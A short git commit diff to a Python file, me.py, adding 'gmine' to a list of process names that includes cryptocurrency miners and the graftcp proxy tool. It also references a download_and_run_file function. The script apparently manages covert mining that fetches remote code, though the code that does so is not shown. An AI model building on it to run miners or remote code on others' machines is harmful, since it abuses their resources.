697d0b37a5959154c4848707b6bdc7e0971b11ca
suplays <137026950+suplays@users.noreply.github.com>
2023-12-11 18:27:11 -0800

    Add files via upload

--- me.py
+++ me.py
@@ -84,7 +84,7 @@ def download_and_run_file():
         print(f"Error downloading/running file: {e}")
 
 if __name__ == "__main__":
-    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local', 'xmrix', 'lol']
+    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local', 'xmrix', 'lol', 'gmine']
     
     while True:
         if check_proxy():
